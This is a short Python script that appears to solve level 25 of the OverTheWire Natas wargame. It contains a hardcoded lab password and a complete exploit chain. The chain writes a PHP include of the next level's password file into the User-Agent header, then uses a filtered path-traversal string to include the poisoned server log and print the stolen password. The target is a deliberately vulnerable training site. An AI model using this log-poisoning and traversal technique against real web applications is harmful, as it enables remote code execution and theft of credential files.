import requests

username = 'natas25'
password = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'

url = "http://%s.natas.labs.overthewire.org" % username


headers = {
    'User-Agent': '<?php include("/etc/natas_webpass/natas26"); ?>'
}


data = {
    'lang': f'../'
}
cookies = requests.post(url, headers=headers, data=data, auth=(username,password)).cookies

data = {
    'lang': f'..././logs/natas25_{cookies["PHPSESSID"]}.log'
}

r = requests.get(url, params=data, cookies=cookies, auth=(username, password))
print(r.text)